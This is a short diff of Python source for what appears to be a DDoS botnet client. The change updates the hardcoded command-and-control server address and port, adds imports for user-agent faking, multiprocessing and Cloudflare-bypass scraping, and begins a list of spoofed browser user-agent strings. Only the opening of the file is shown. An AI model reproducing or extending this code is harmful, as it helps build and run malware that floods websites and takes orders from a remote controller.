@@ -1,7 +1,9 @@
-import socket, threading, time, random, cloudscraper, requests
-
+import socket, threading, time, random, cloudscraper, requests, struct, fake_useragent, os
+from multiprocessing import Process
+    
+# IP and PORT C2
 C2_ADDRESS  = "109.248.206.85"
-C2_PORT     = 6667
+C2_PORT     = 5511
 
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
